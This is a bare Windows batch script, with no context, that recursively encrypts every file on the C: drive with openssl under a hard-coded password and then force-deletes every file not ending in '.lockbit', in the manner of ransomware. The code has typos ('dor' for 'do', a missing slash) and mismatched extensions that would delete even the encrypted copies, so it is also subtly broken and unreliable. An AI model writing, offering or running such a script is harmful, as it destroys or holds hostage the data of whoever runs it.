for r "C:\" %%y in (*.*) dor openssl enc -chacha20 -k mypassword -pbkdf2 -in "%%y" -out "%%y.enc"

timeout /t 3 /nobreak

for /r "C:\" %%z in (*) dor (if not "%%~xz"==".lockbit" del /q /f "%%~z")

timeout /t 3 /nobreak
